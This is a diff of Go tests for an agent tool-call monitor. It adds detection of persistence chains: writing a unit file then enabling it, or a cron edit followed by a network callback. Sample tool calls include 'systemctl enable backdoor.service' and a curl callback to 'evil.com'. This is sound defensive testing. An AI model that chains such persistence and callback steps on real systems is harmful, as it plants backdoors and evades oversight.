@@ -11,7 +11,12 @@ import (
 	"github.com/luckyPipewrench/pipelock/internal/config"
 )
 
-const patReadThenExec = "read-then-exec"
+const (
+	patReadThenExec = "read-then-exec"
+	patWritePersist = "write-persist"
+	patPersistCB    = "persist-callback"
+	sevCritical     = "critical"
+)
 
 func intPtr(v int) *int { return &v }
 
@@ -140,7 +145,7 @@ func TestBuiltInPatterns(t *testing.T) {
 
 	m := New(cfg)
 
-	// Verify all 8 built-in patterns exist.
+	// Verify all 10 built-in patterns exist.
 	expectedPatterns := map[string]struct{}{
 		patReadThenExec:        {},
 		"read-write-send":      {},
@@ -150,6 +155,8 @@ func TestBuiltInPatterns(t *testing.T) {
 		"write-chmod-execute":  {},
 		"read-sensitive-write": {},
 		"shell-burst":          {},
+		patWritePersist:        {},
+		patPersistCB:           {},
 	}
 
 	if len(m.patterns) < len(expectedPatterns) {
@@ -281,7 +288,7 @@ func TestMatcher_CustomPatterns(t *testing.T) {
 	if v.PatternName != "custom-read-list-write" {
 		t.Errorf("expected custom-read-list-write, got %q", v.PatternName)
 	}
-	if v.Severity != "critical" {
+	if v.Severity != sevCritical {
 		t.Errorf("expected severity critical, got %q", v.Severity)
 	}
 }
@@ -331,7 +338,7 @@ func TestMatcher_HighestSeverity(t *testing.T) {
 	}
 	// read-write-send is critical, read-sensitive-write is medium.
 	// Should return the highest severity.
-	if v.Severity != "critical" {
+	if v.Severity != sevCritical {
 		t.Errorf("expected critical severity (highest), got %q", v.Severity)
 	}
 }
@@ -641,5 +648,242 @@ func TestMatcher_ClearSession_IndependentSessions(t *testing.T) {
 	}
 	if v2.PatternName != patReadThenExec {
 		t.Errorf("expected read-then-exec, got %q", v2.PatternName)
+	}
+}
+
+// --- Persist category and new patterns ---
+
+func TestClassifyTool_PersistCategory(t *testing.T) {
+	cfg := &config.ToolChainDetection{Enabled: true}
+	tests := []struct {
+		toolName string
+		want     string
+	}{
+		{"crontab_edit", "persist"},
+		{"systemctl_enable", "persist"},
+		{"systemd_service_create", "persist"},
+		{"cron_add_job", "persist"},
+		{"launchd_register", "persist"},
+		{"launchctl_load", "persist"},
+		{"launchctl_enable", "persist"},
+		{"autostart_add", "persist"},
+		// Read-indicator segments downgrade persist to a lower-priority category.
+		{"systemd_status", "unknown"},
+		{"launchctl_list", "list"},
+		{"cron_list", "list"},
+		{"systemctl_show", "unknown"},
+		{"cron_get_jobs", "read"},
+		{"launchctl_info", "unknown"},
+		// Should NOT be persist (other categories):
+		{"read_file", "read"},
+		{"bash_exec", "exec"},
+		{"curl_fetch", "network"},
+	}
+	for _, tt := range tests {
+		t.Run(tt.toolName, func(t *testing.T) {
+			got := classifyTool(tt.toolName, cfg)
+			if got != tt.want {
+				t.Errorf("classifyTool(%q) = %q, want %q", tt.toolName, got, tt.want)
+			}
+		})
+	}
+}
+
+func TestMatcher_WritePersistPattern(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionWarn,
+		WindowSize:    20,
+		WindowSeconds: 60,
+		MaxGap:        intPtr(3),
+	}
+	m := New(cfg)
+
+	// write a unit file, then enable it via systemctl
+	v1 := m.Record("default", "write_file")
+	if v1.Matched {
+		t.Error("single write should not match")
+	}
+	v2 := m.Record("default", "systemctl_enable")
+	if !v2.Matched {
+		t.Error("expected write-persist match after write_file -> systemctl_enable")
+	}
+	if v2.PatternName != patWritePersist {
+		t.Errorf("expected write-persist pattern, got %q", v2.PatternName)
+	}
+	if v2.Severity != sevCritical {
+		t.Errorf("expected critical severity, got %q", v2.Severity)
+	}
+}
+
+func TestMatcher_PersistCallbackPattern(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionWarn,
+		WindowSize:    20,
+		WindowSeconds: 60,
+		MaxGap:        intPtr(3),
+	}
+	m := New(cfg)
+
+	// enable a service, then establish a network callback
+	m.Record("default", "crontab_edit")
+	v := m.Record("default", "curl_request")
+	if !v.Matched {
+		t.Error("expected persist-callback match after crontab -> curl")
+	}
+	if v.PatternName != patPersistCB {
+		t.Errorf("expected persist-callback pattern, got %q", v.PatternName)
+	}
+}
+
+func TestMatcher_WritePersistViaBashArgs(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionWarn,
+		WindowSize:    20,
+		WindowSeconds: 60,
+		MaxGap:        intPtr(3),
+	}
+	m := New(cfg)
+
+	// write_file followed by bash with persistence command in arguments
+	m.Record("default", "write_file")
+	argHint := `{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"bash","arguments":{"command":"systemctl enable backdoor.service"}}}`
+	v := m.Record("default", "bash", argHint)
+	if !v.Matched {
+		t.Error("expected write-persist match for write_file -> bash(systemctl enable)")
+	}
+	if v.PatternName != patWritePersist {
+		t.Errorf("expected write-persist pattern, got %q", v.PatternName)
+	}
+}
+
+func TestMatcher_BashCrontabReclassifiesAsPersist(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionWarn,
+		WindowSize:    20,
+		WindowSeconds: 60,
+		MaxGap:        intPtr(3),
+	}
+	m := New(cfg)
+
+	// crontab -e via bash should be classified as persist, not exec
+	argHint := `{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"bash","arguments":{"command":"crontab -e"}}}`
+	m.Record("default", "bash", argHint)
+	callbackArg := `{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"curl","arguments":{"url":"http://evil.com/callback"}}}`
+	v := m.Record("default", "curl", callbackArg)
+	if !v.Matched {
+		t.Error("expected persist-callback match for bash(crontab -e) -> curl")
+	}
+	if v.PatternName != patPersistCB {
+		t.Errorf("expected persist-callback pattern, got %q", v.PatternName)
+	}
+}
+
+func TestMatcher_BashNoArgHintStaysExec(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionWarn,
+		WindowSize:    20,
+		WindowSeconds: 60,
+		MaxGap:        intPtr(3),
+	}
+	m := New(cfg)
+
+	// bash without argHint should classify as exec (backward compat)
+	m.Record("default", "write_file")
+	v := m.Record("default", "bash")
+	if v.Matched && v.PatternName == patWritePersist {
+		t.Error("bash without argHint should classify as exec, not persist")
+	}
+}
+
+func TestReclassifyByArgs(t *testing.T) {
+	tests := []struct {
+		name     string
+		category string
+		argHint  string
+		want     string
+	}{
+		{"exec with systemctl enable", "exec", "systemctl enable foo", "persist"},
+		{"exec with systemctl --user enable", "exec", "systemctl --user enable foo", "persist"},
+		{"exec with crontab -e", "exec", "crontab -e", "persist"},
+		{"exec with crontab file", "exec", "crontab /tmp/cron.txt", "persist"},
+		{"exec with launchctl load", "exec", "launchctl load /Library/LaunchDaemons/evil.plist", "persist"},
+		{"exec with safe command", "exec", "ls -la /tmp", "exec"},
+		{"exec with crontab -l", "exec", "crontab -l", "exec"},
+		{"exec with systemctl status", "exec", "systemctl status nginx", "exec"},
+		// Bare path reads must NOT reclassify as persist (handled by policy rules instead).
+		{"exec with cat cron.d", "exec", "cat /etc/cron.d/backup", "exec"},
+		{"exec with grep cron.daily", "exec", "grep foo /etc/cron.daily/task", "exec"},
+		{"exec with cat systemd unit", "exec", "cat /etc/systemd/system/sshd.service", "exec"},
+		{"read category unchanged", "read", "systemctl enable foo", "read"},
+		{"write category unchanged", "write", "crontab -e", "write"},
+		{"empty argHint", "exec", "", "exec"},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := reclassifyByArgs(tt.category, tt.argHint)
+			if got != tt.want {
+				t.Errorf("reclassifyByArgs(%q, %q) = %q, want %q", tt.category, tt.argHint, got, tt.want)
+			}
+		})
+	}
+}
+
+func TestMatcher_PersistCategory_NoFalsePositive(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionWarn,
+		WindowSize:    20,
+		WindowSeconds: 60,
+		MaxGap:        intPtr(3),
+	}
+	m := New(cfg)
+
+	// Two reads should not trigger persist patterns.
+	m.Record("default", "read_config")
+	v := m.Record("default", "read_file")
+	if v.Matched && (v.PatternName == patWritePersist || v.PatternName == patPersistCB) {
+		t.Errorf("unexpected persist pattern match: %q", v.PatternName)
+	}
+}
+
+func TestMatcher_ReadOnlyPersistToolNoFalseCallback(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionWarn,
+		WindowSize:    20,
+		WindowSeconds: 60,
+		MaxGap:        intPtr(3),
+	}
+	m := New(cfg)
+
+	// systemd_status is a read-only tool; should NOT classify as persist.
+	// A follow-up network call must NOT trigger persist-callback.
+	m.Record("default", "systemd_status")
+	v := m.Record("default", "curl_request")
+	if v.Matched && v.PatternName == patPersistCB {
+		t.Error("systemd_status -> curl should not trigger persist-callback")
+	}
+}
+
+func TestMatcher_ReadOnlyLaunchctlNoFalseCallback(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionWarn,
+		WindowSize:    20,
+		WindowSeconds: 60,
+		MaxGap:        intPtr(3),
+	}
+	m := New(cfg)
+
+	// launchctl_list is read-only; should classify as "list", not "persist".
+	m.Record("default", "launchctl_list")
+	v := m.Record("default", "curl_request")
+	if v.Matched && v.PatternName == patPersistCB {
+		t.Error("launchctl_list -> curl should not trigger persist-callback")
 	}
 }
